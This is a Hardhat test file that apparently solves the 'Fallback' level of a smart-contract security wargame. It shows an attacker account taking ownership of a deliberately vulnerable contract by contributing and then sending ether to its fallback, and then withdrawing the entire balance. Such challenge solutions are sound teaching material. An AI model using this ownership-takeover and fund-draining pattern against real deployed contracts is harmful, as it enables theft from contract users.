import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Contract } from 'ethers';

import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

describe('01 - Fallback', () => {
  let Contract;
  let contract: Contract;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  beforeEach(async () => {
    Contract = await ethers.getContractFactory('FallbackV2');
    [owner, attacker] = await ethers.getSigners();

    contract = await Contract.deploy();
  });

  describe('Takeover the contract.', () => {
    it('should withdraw all balance', async () => {
      await contract.connect(attacker).contribute({ value: 1 });

      await attacker.sendTransaction({
        to: contract.address,
        value: ethers.utils.parseUnits('1', 'wei')
      });

      const contractOwner = await contract.owner();
      // Attacker is already owner.
      expect(contractOwner).to.eq(attacker.address);

      const tx = await contract.connect(attacker).withdraw();
      tx.wait();

      const balance = await contract.provider.getBalance(contract.address);

      // Balance is 0
      expect(balance).to.eq(0);
    });
  });
});
